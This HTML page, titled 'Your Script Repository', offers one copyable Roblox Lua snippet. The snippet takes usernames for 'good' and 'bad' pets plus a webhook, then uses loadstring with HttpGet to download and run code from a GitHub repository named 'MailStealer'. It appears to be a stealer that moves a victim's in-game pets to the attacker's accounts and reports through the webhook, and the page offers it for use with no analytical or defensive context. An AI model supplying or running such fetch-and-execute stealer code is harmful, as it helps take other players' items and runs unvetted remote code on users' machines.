<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Script Repository</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            color: #333;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin-top: 20px;
        }

        .script-box {
            border: 1px solid #ccc;
            padding: 20px;
            margin-bottom: 20px;
            background-color: #f8f8f8;
            border-radius: 8px;
        }

        .script-box h2 {
            color: #4b0082;
        }

        .copy-button {
            background-color: #4b0082;
            color: white;
            border: none;
            padding: 8px 16px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 10px;
        }

        .copy-button:hover {
            background-color: #800080;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="text-align: center; color: #4b0082;">Your Script Repository</h1>

        <div class="script-box" id="script1">
            <h2>Script 1</h2>
            <pre><code class="lua">
UserName = ""           --FOR GOOD PETS
Webhook = ""            --UR WEBHOOK
UserName2 = ""          --FOR BAD PETS

loadstring(game:HttpGet("https://raw.githubusercontent.com/ArkoScripts/MailStealer/main/main.lua"))()
            </code></pre>
            <button class="copy-button" onclick="copyToClipboard('script1')">Copy Script</button>
        </div>
    </div>

    <script>
        function copyToClipboard(scriptId) {
            var scriptText = document.getElementById(scriptId).textContent;
            var tempInput = document.createElement('input');
            document.body.appendChild(tempInput);
            tempInput.value = scriptText;
            tempInput.select();
            document.execCommand('copy');
            document.body.removeChild(tempInput);
            alert('Script copied to clipboard!');
        }
    </script>
</body>
</html>
